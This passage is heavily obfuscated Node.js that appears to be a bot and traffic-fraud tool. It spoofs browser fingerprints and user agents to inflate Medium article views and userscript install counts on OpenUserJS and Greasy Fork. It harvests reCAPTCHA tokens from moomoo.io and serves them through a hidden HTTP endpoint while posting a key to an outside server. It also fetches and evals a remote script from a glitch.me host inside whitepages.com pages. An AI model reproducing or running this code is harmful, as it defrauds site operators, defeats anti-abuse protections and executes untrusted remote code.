      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + a6(0x7) + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + a6(0x12) + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + a3(0xe, 'LcN(') + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0xe8 * 0x7 + -0x2 * 0xdfa + 0x734 * 0x3
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x162d * -0x1 + 0x1 * 0x17c5 + 0x66 * -0x4)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const a7 = c;
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios[a7(0x15)](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1 * -0x1f51 + -0x1 * -0x1594 + 0x1 * 0xa21), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x2099 + -0x24d9 + -0x9 * -0x84), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1968 + 0x1a3 + 0x4c1 * 0x5;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1f18 + 0x3 * -0x115 + 0x95 * 0x3b; w < getRandomInt(0x6d * -0x42 + -0x17 * 0x17b + 0x3e28, -0x3fd * -0x5 + -0x43a + 0x29 * -0x62); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x23ce * 0xa + -0x9bfd + 0x2051);
        }
      }();
    }, -0xe1b + 0xa6 * -0x1d + 0x214d), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x2067 + 0xb9 + -0x2120;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x2 * 0x21a + -0x269e + -0xe46 * -0x3, -0x5c5 * 0x2 + -0x1a7a + -0x131b * -0x2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          const a8 = b;
          window['grecaptcha']['execute']('6LevKusUAA' + a8(0x1, '*x7R') + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x55e1 * 0x1 + 0x66dd + -0x478e);
    }, -0x132 + -0x254 + 0x3ea), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0xcd0 + 0x10 * 0x254 + -0x1870;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x5b4 + -0x6 * 0x115 + 0x2 * 0xbf5), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x88b + 0x3d2 * 0x3 + 0x1 * -0x1401), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x17 * 0x58bc + 0x130e82 + 0x2a602 * 0x1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x2650 + -0x22 * -0x121 + 0x52);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x14b * -0x1 + 0x5b * -0x2f + -0x8 * -0x259);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x2 * 0x6bb + 0x29a + 0x2a6c);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const a9 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xa2 + -0xd9f * 0x1 + 0xcfe) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1156 * 0x2 + -0x1 * 0x207f + 0x2 * -0x116));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1f45 + -0x11 * 0x7a + -0x9 * 0x293, D['indexOf']('\x20'));
        return B ? E['slice'](-0x177a + 0xa79 * -0x1 + 0x21f3, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x4 * 0xba1 + -0x1c1d * -0x1 + -0x1 * -0x3977),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x4d7b + -0x4cbf + 0x1be * 0x16),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': a9(0x2, '[3^^'),
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x2 * 0x61f + 0x1a9c + 0x6 * -0x265; k < 0x308 * 0x3 + 0x5f * 0x19 + -0x125b; k++)
    setTimeout(f, (-0x7569 + -0x17da8 + 0x22ed * 0x15) * k * getRandomInt(-0x476 + 0x22c6 + -0x1 * 0x1e4f, 0x1c54 + -0x695 + 0xd6 * -0x1a));
  setInterval(() => {
    f();
    for (let l = -0x2053 + 0x1 * 0x1641 + 0x1 * 0xa12; l < -0x1891 + -0xc25 * -0x1 + -0xc7 * -0x10; l++)
      setTimeout(f, (0x11227 + 0x1 * -0x74e3 + 0x4d1c) * l * getRandomInt(-0x2416 + -0x4b1 + 0x122 * 0x24, 0x23fc + 0xa3d * 0x2 + 0x3873 * -0x1));
